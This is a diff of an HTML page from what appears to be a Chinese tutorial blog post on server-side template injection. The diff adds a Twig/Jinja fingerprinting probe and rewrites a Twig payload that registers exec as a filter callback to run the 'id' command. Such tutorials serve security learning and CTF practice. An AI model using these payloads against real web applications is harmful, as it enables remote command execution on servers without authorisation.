@@ -82,7 +82,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">2.4k</span>
+            <span class="post-count">2.5k</span>
         </span>
     </span>
 
@@ -108,6 +108,9 @@
        
   <h1 id="一-、什么是SSTI"><a href="#一-、什么是SSTI" class="headerlink" title="一 、什么是SSTI"></a>一 、什么是SSTI</h1><h2 id="0x00-模板注入"><a href="#0x00-模板注入" class="headerlink" title="0x00 模板注入"></a>0x00 模板注入</h2><p>这是基于现在的MVC成熟的开发模式所导致的，开发者将输入通过V接收，交给C，然后由 C 调用 M 或者其他的 C 进行处理，最后再返回给 V ，这样就最终显示在我们的面前了，那么这里的 V 中就大量的用到了一种叫做<strong>模板</strong>的技术。<strong>这种模板的技术不是仅存在于Python</strong>，只要能使用模版进行开发的地方都会有这个问题，SSTI不属于任何一种的问题，沙盒绕过也不是。</p>
 <h2 id="0x01常见的模板"><a href="#0x01常见的模板" class="headerlink" title="0x01常见的模板"></a>0x01常见的模板</h2><p>PHP：Smarty，Twig（经常出题），Blade</p>
+<p>判断</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Twig </span><br><span class="line">&#123;&#123;7*&#39;7&#39;&#125;&#125;  #输出49</span><br><span class="line">Jinja</span><br><span class="line">&#123;&#123;7*&#39;7&#39;&#125;&#125;  #输出7777777</span><br></pre></td></tr></table></figure>
+
 <p>Java：JSP，FreeMarker，Velocity</p>
 <p>Python： Jinja2（常用），django，tornado</p>
 <p>tornado render() 中支持传入自定义函数，以及函数的参数，然后在两个大括号中执行</p>
@@ -157,7 +160,7 @@
 <p>新的大佬又出现了:</p>
 <p> <a target="_blank" rel="noopener" href="https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Environment.php#L874">getFilter()</a></p>
 <p>我们只要把exec() 作为回调函数传进去就能实现命令执行了.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>3.freeMarker</p>
 <p>java模板</p>
